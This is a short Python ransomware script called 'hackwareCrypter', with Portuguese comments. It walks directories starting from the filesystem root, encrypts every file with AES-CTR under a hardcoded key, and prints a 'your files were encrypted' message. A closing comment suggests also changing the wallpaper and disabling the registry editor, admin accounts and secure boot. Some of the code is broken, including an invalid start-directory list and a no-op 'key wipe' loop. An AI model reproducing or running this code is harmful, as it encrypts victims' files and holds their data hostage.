#!/usr/bin/python3.7
#-8- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import discovery
import crypter

# A senha pode ter os seguintes tamanhos :
# 128/192/256 bits - 
HARDCODE_KEY = '10101010101010101010101010101010'

def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")

    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')

    return parser

def main():
    parser = get_parser()

    args= vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('Seus arquivos foram criptografados {}'.format(HARDCODE_KEY))
        key = input('Digite a sua senha> ')
    else:
        if HARDCODE_KEY:
            key = HARDCODE_KEY


    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        crytoFn = crypt.encrypt
    else:
        crytoFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [/]

    for currentDir in startDirs:
        for filename in discovery.discover(currentDir):
            crypter.change_files(filename, crytoFn)

# Limpa a chave de ciptografia da memoria
    for _ in range(100):
        pass

    if not decrypt:
        pass
# Após a encriptação, você pode alterar o wallpaper, os icones, deativoa o regedit, admins, bios secure boot, etc
if __name__ =='__main__':
    main()
